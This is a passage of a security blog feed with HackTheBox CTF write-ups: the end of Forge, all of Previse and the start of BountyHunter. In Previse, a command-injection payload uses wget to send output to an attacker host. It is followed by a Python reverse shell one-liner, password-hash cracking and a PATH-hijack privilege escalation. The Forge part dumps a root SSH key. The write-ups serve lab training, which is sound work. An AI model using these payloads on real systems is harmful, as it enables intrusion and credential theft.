terminal and &lt;code&gt;nc&lt;/code&gt;, then we just input a "q" that will not be recognize and get
a &lt;a href="https://docs.python.org/3/library/pdb.html"&gt;PDB&lt;/a&gt; in our first shell allowing
us to load the &lt;code&gt;os&lt;/code&gt; module and execute system commands as root using
&lt;code&gt;os.system([COMMAND])&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py&lt;/span&gt;
&lt;span class="code-line"&gt;Listening on localhost:59816&lt;/span&gt;
&lt;span class="code-line"&gt;invalid literal for int() with base 10: b&amp;#39;q&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; /opt/remote-manage.py(27)&amp;lt;module&amp;gt;()&lt;/span&gt;
&lt;span class="code-line"&gt;-&amp;gt; option = int(clientsock.recv(1024).strip())&lt;/span&gt;
&lt;span class="code-line"&gt;(Pdb) --KeyboardInterrupt--&lt;/span&gt;
&lt;span class="code-line"&gt;(Pdb) import os&lt;/span&gt;
&lt;span class="code-line"&gt;(Pdb) os.system(&amp;#39;id&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We just grab the root SSH private key and connect on the box as &lt;code&gt;root&lt;/code&gt; allowing us
to get the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;(Pdb) os.system(&amp;#39;ls /root/.ssh&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;authorized_keys  id_rsa  id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;0&lt;/span&gt;
&lt;span class="code-line"&gt;(Pdb) os.system(&amp;#39;cat /root/.ssh/id_rsa&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;
&lt;span class="code-line"&gt;NhAAAAAwEAAQAAAYEAusTE7uvvBLrfqDLv6I/+Xc9W/RVGA4eFPOowUNkHDZ4MTUm4cK4/&lt;/span&gt;
&lt;span class="code-line"&gt;DdTvY7o7bvSinEX26rWdG4eVY3qnBGSACl3VIGX80NsWgyZwWQT20Vj0q8gf674RB4LfB6&lt;/span&gt;
&lt;span class="code-line"&gt;i6Awm8cbm3105HxfQnqr4qr2oJEpyDVaF29zpaS+6y0Ogq7HcRkSyQyErBnGmlOYBcBvvh&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ ssh forge.htb -l root -i id_rsa_root&lt;/span&gt;
&lt;span class="code-line"&gt;root@forge:~# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;root@forge:~# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;5a7c66fcccbc8a380f220f349e6eea95&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was really easy for a medium one. The root part really easy. I
triggered it by mistake as "q" for quit is an old habit. Once you get the
subdomain the user part just requires to follow the dots. A great medium box for
beginners.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="SSRF"></category><category term="LFI"></category></entry><entry><title>HTB: Previse</title><link href="https://maggick.fr/2022/01/htb-previse.html" rel="alternate"></link><published>2022-01-08T17:44:00+01:00</published><updated>2022-01-08T17:44:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-01-08:/2022/01/htb-previse.html</id><summary type="html">&lt;p&gt;&lt;img alt="Previse" class="align-left" src="/media/2022.01/previse_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/373"&gt;Previse&lt;/a&gt; publish on
August 7, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/107145"&gt;m4lwhere&lt;/a&gt;.
This box is rated as an easy machine. It implies a hidden page, a unsanitize
variable, a funny salt and a relative PATH.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.01/previse_card.png" alt="Previse" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/373"&gt;Previse&lt;/a&gt; publish on
August 7, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/107145"&gt;m4lwhere&lt;/a&gt;.
This box is rated as an easy machine. It implies a hidden page, a unsanitize
variable, a funny salt and a relative PATH.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Aug 28 08:31:50 2021 as: nmap -p- -sSV -oN notes.md -A 10.129.193.153&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.193.153&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website is a simple authentication form. We launch &lt;code&gt;ffuf&lt;/code&gt; against it and
found a few pages.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ./ffuf -w /usr/share/dirb/wordlists/common.txt -u  http://10.129.193.153/FUZZ -mc 200 -e .php&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]&lt;/span&gt;
&lt;span class="code-line"&gt;favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]&lt;/span&gt;
&lt;span class="code-line"&gt;footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]&lt;/span&gt;
&lt;span class="code-line"&gt;header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]&lt;/span&gt;
&lt;span class="code-line"&gt;login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]&lt;/span&gt;
&lt;span class="code-line"&gt;nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]&lt;/span&gt;
&lt;span class="code-line"&gt;:: Progress: [9228/9228] :: Job [1/1] :: 2567 req/sec :: Duration: [0:00:03] :: Errors: 0 ::&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Looking at &lt;code&gt;nav.php&lt;/code&gt; we found the &lt;code&gt;accounts.php&lt;/code&gt; page with an automatic redirection to the login page
we look at the HTML and send the post request required to create an account
using Burp. We can then login as our user on the application&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /accounts.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.129.193.153&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 51&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=uu672fe9ecq5640am2fgsekhbk&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;username=toto1&amp;amp;password=12345&amp;amp;confirm=12345&amp;amp;submit=&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can download the &lt;code&gt;siteBackup&lt;/code&gt; file on the server.
The &lt;code&gt;logs.php&lt;/code&gt; file seems to be called when we want to get the log data via the management menu.
We can see that the POST parameter &lt;code&gt;delim&lt;/code&gt; is not sanitize and use directly in an &lt;code&gt;exec&lt;/code&gt; statement.
We can use that to run code on the box. We run a simple python HTTP server (&lt;code&gt;python3 -m http.server&lt;/code&gt;)
and using Burp repeater put the following payload in the &lt;code&gt;delim&lt;/code&gt; parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /logs.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.129.193.153&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 35&lt;/span&gt;
&lt;span class="code-line"&gt;Origin: http://10.129.193.153&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Referer: http://10.129.193.153/file_logs.php&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=uu672fe9ecq5640am2fgsekhbk&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;delim=; wget 10.10.14.52:8000/$(id)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got the RCE on our web server:
&lt;code&gt;10.129.193.153 - - [28/Aug/2021 09:06:34] "GET /uid=33(www-data) HTTP/1.1" 404 -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We know that python is on the box so we use a basic python reverse shell. The
payload is the following:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;delim=; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.52",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We run &lt;code&gt;netcat&lt;/code&gt; on our kali box to catch our reverse shell and are logged in
as the &lt;code&gt;www-data&lt;/code&gt; user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -l -p 4242&lt;/span&gt;
&lt;span class="code-line"&gt;$ id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using the connection credentials in the &lt;code&gt;config.php&lt;/code&gt; file we can login on the
MySQL database as &lt;code&gt;root&lt;/code&gt; and grab the passwords in the &lt;code&gt;accounts&lt;/code&gt; table.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ mysql -u root -p&lt;/span&gt;
&lt;span class="code-line"&gt;mysql -u root -p&lt;/span&gt;
&lt;span class="code-line"&gt;Enter password: mySQL_p@ssw0rd!:)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to the MySQL monitor.  Commands end with ; or \g.&lt;/span&gt;
&lt;span class="code-line"&gt;mysql&amp;gt; use previse;&lt;/span&gt;
&lt;span class="code-line"&gt;use previse;&lt;/span&gt;
&lt;span class="code-line"&gt;Reading table information for completion of table and column names&lt;/span&gt;
&lt;span class="code-line"&gt;You can turn off this feature to get a quicker startup with -A&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Database changed&lt;/span&gt;
&lt;span class="code-line"&gt;mysql&amp;gt; SHOW TABLES;&lt;/span&gt;
&lt;span class="code-line"&gt;SHOW TABLES;&lt;/span&gt;
&lt;span class="code-line"&gt;+-------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| Tables_in_previse |&lt;/span&gt;
&lt;span class="code-line"&gt;+-------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| accounts          |&lt;/span&gt;
&lt;span class="code-line"&gt;| files             |&lt;/span&gt;
&lt;span class="code-line"&gt;+-------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;2 rows in set (0.00 sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;mysql&amp;gt; select * from accounts;&lt;/span&gt;
&lt;span class="code-line"&gt;select * from accounts;&lt;/span&gt;
&lt;span class="code-line"&gt;+----+----------+------------------------------------+---------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| id | username | password                           | created_at          |&lt;/span&gt;
&lt;span class="code-line"&gt;+----+----------+------------------------------------+---------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |&lt;/span&gt;
&lt;span class="code-line"&gt;|  2 | totoo    | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-08-25 12:49:52 |&lt;/span&gt;
&lt;span class="code-line"&gt;|  3 | toto1    | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2021-08-25 12:50:25 |&lt;/span&gt;
&lt;span class="code-line"&gt;+----+----------+------------------------------------+---------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;3 rows in set (0.00 sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run john on the hashes (keep the unicode salt character in the salt value)
with the rockyou dictionary and got the &lt;code&gt;m4lwhere&lt;/code&gt; user password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ john -w=rockyou.txt hash --format=md5crypt-long&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 3 password hashes with no different salts (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 8 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;123456           (?)&lt;/span&gt;
&lt;span class="code-line"&gt;12345            (?)&lt;/span&gt;
&lt;span class="code-line"&gt;2g 0:00:00:51 6.65% (ETA: 15:36:49) 0.03919g/s 21235p/s 21235c/s 21238C/s 438700..4358427&lt;/span&gt;
&lt;span class="code-line"&gt;2g 0:00:02:09 18.48% (ETA: 15:35:40) 0.01550g/s 22220p/s 22220c/s 22221C/s vixieskathys109..vixen911&lt;/span&gt;
&lt;span class="code-line"&gt;ilovecody112235! (?)&lt;/span&gt;
&lt;span class="code-line"&gt;3g 0:00:06:35 DONE (2021-08-28 15:30) 0.007588g/s 18752p/s 18752c/s 18752C/s ilovecoke95..ilovecody*&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use this password to connect on the SSH service and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh m4lwhere@10.129.193.153 #ilovecody112235!&lt;/span&gt;
&lt;span class="code-line"&gt;m4lwhere@previse:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)&lt;/span&gt;
&lt;span class="code-line"&gt;m4lwhere@previse:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;15af390166c631f24622d77948ba2444&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We look at our &lt;code&gt;sudo&lt;/code&gt; privileges and found that we can run a bash script as
root.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;m4lwhere@previse:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;[sudo] password for m4lwhere:&lt;/span&gt;
&lt;span class="code-line"&gt;User m4lwhere may run the following commands on previse:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) /opt/scripts/access_backup.sh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Looking at the script we quickly notice the use of a relative path to call the
&lt;code&gt;gzip&lt;/code&gt; binary we should be able to easily run anything.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh&lt;/span&gt;
&lt;span class="code-line"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# We always make sure to store logs, we take security SERIOUSLY here&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# I know I shouldnt run this as root but I cant figure it out programmatically on my account&lt;/span&gt;
&lt;span class="code-line"&gt;# This is configured to run with cron, added to sudo so I can run as needed - we&amp;#39;ll fix it later when there&amp;#39;s time&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;gzip -c /var/log/apache2/access.log &amp;gt; /var/backups/$(date --date=&amp;quot;yesterday&amp;quot; +%Y%b%d)_access.gz&lt;/span&gt;
&lt;span class="code-line"&gt;gzip -c /var/www/file_access.log &amp;gt; /var/backups/$(date --date=&amp;quot;yesterday&amp;quot; +%Y%b%d)_file_access.gz&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Obviously we could just retrive the flag by putting &lt;code&gt;cp /root/root.txt /tmp &amp;amp;&amp;amp; chmod 777 /tmp/*&lt;/code&gt;
in our &lt;code&gt;gzip&lt;/code&gt; file but a &lt;code&gt;root&lt;/code&gt; shell is better.&lt;/p&gt;
&lt;p&gt;We have a few ways to get a root shell with our command injection:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Add a root (id 0) user to &lt;code&gt;/etc/passwd&lt;/code&gt; with a password of our choice (see &lt;a href="/2021/07/htb-armageddon.html"&gt;armageddon&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;surcharge our &lt;code&gt;sudo&lt;/code&gt; permissions  (see &lt;a href="https://maggick.fr/2021/12/htb-bountyhunter.html"&gt;bountyhunter&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Add an ssh key to &lt;code&gt;root&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;run a reverse shell&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We will use the latest one here and get a reverse shell as &lt;code&gt;root&lt;/code&gt; allowing to grab
the last flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;m4lwhere@previse:~$ export PATH=./:$PATH&lt;/span&gt;
&lt;span class="code-line"&gt;m4lwhere@previse:~$ vim gzip&lt;/span&gt;
&lt;span class="code-line"&gt;m4lwhere@previse:~$ cat gzip&lt;/span&gt;
&lt;span class="code-line"&gt;python -c &amp;#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.52&amp;quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;m4lwhere@previse:~$ chmod +x gzip&lt;/span&gt;
&lt;span class="code-line"&gt;m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ nc -l -p 4242&lt;/span&gt;
&lt;span class="code-line"&gt;# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;d465e7ac787731bbd7de2f69444407e3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;An easy box really recommended for beginners as their is only two classical
vulnerabilities here.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="PATH"></category></entry><entry><title>HTB: BountyHunter</title><link href="https://maggick.fr/2021/12/htb-bountyhunter.html" rel="alternate"></link><published>2021-12-28T19:15:00+01:00</published><updated>2021-12-28T19:15:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-12-28:/2021/12/htb-bountyhunter.html</id><summary type="html">&lt;p&gt;&lt;img alt="BountyHunterCard" class="align-left" src="/media/2021.12/bountyhunter_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/359"&gt;BountyHunter&lt;/a&gt; publish on
July 25, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/280547"&gt;ejedev&lt;/a&gt;.
This box is rated as an easy machine. It implies an XXE and some python.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.12/bountyhunter_card.png" alt="BountyHunterCard" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/359"&gt;BountyHunter&lt;/a&gt; publish on
July 25, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/280547"&gt;ejedev&lt;/a&gt;.
This box is rated as an easy machine. It implies an XXE and some python.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Wed Jul 28 04:40:09 2021 as: nmap -A -p- -sSV -oN notes.md 10.129.180.140&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.180.140&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.018s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;| ssh-hostkey:&lt;/span&gt;
&lt;span class="code-line"&gt;|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)&lt;/span&gt;
&lt;span class="code-line"&gt;|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)&lt;/span&gt;
&lt;span class="code-line"&gt;|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Apache/2.4.41 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Bounty Hunters&lt;/span&gt;
&lt;span class="code-line"&gt;Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)&lt;/span&gt;
&lt;span class="code-line"&gt;No exact OS matches for host (test conditions non-ideal).&lt;/span&gt;
&lt;span class="code-line"&gt;Network Distance: 2 hops&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;TRACEROUTE (using port 1720/tcp)&lt;/span&gt;
&lt;span class="code-line"&gt;HOP RTT      ADDRESS&lt;/span&gt;
&lt;span class="code-line"&gt;1   17.87 ms 10.10.14.1&lt;/span&gt;
&lt;span class="code-line"&gt;2   18.02 ms 10.129.180.140&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="web"&gt;Web&lt;/h1&gt;
&lt;p&gt;The website is a bug bounty one.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Website homepage" src="/media/2021.12/bountyhunter_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We launch a &lt;a href="https://github.com/ffuf/ffuf"&gt;fuff&lt;/a&gt; against it, founding a
&lt;code&gt;db.php&lt;/code&gt; script (which return an empty page).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ./ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.73.239/FUZZ -e .php -mc 200&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]&lt;/span&gt;
&lt;span class="code-line"&gt;index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]&lt;/span&gt;
&lt;span class="code-line"&gt;index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]&lt;/span&gt;
&lt;span class="code-line"&gt;portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6]&lt;/span&gt;
